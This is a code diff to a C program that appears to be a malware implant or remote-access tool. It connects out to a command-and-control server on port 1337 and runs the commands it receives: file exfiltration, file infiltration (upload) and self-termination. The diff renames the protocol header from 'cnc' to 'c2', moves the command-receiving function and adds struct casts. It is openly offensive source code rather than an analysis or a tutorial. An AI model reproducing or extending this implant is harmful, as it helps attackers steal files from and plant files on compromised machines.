@@ -10,7 +10,7 @@
 #include <arpa/inet.h>
 #include <stdbool.h>
 
-#include "cnc_prot.h"
+#include "c2_prot.h"
 #include "actions.h"
 
 #define CNC_PORT 1337
@@ -50,34 +50,11 @@ int connect_cnc()
     return sockfd;
 }
 
-struct cnc_request *receive_command(int sockfd)
-{
-    struct cnc_request req_tmp;
-    struct cnc_request *req;
-
-    if (read(sockfd, &req_tmp, sizeof(struct cnc_request)) != sizeof(struct cnc_request))
-    {
-        perror("Failed to receive command");
-        return NULL;
-    }
-
-    req = malloc(req_tmp.req_len);
-
-    memset(req, 0, req_tmp.req_len);
-    memcpy(req, &req_tmp, sizeof(req_tmp));
-
-    printf("Command Info:\n\ttype: %hhu\n\trequest length: %hu\n", req->type, req->req_len);
-
-    read(sockfd, req->data, req->req_len - sizeof(struct cnc_request));
-
-    return req;
-}
-
 int main()
 {
     int sockfd = 0;
     bool is_suicidal = false;
-    struct cnc_request *req;
+    struct c2_req *req;
 
     while (1)
     {
@@ -90,16 +67,18 @@ int main()
 
         while (req = receive_command(sockfd))
         {
+            printf("Command Info:\n\ttype: %hhu\n\trequest length: %hu\n", req->type, req->req_len);
+
             switch (req->type)
             {
             case EXF_FILE:
                 puts("File exfiltration command received");
-                exfiltrate_file(sockfd, req);
+                exfiltrate_file(sockfd, (struct exf_req *)req);
                 break;
 
             case INF_FILE:
                 puts("File infiltration command received");
-                infiltrate_file(sockfd, req);
+                infiltrate_file(sockfd, (struct inf_req *)req);
                 break;
 
             case SUICIDE:
@@ -117,6 +96,8 @@ int main()
             if (is_suicidal)
                 goto cleanup;
         }
+
+        if (!req) perror("Failed to receive command");
     }
 
 cleanup:
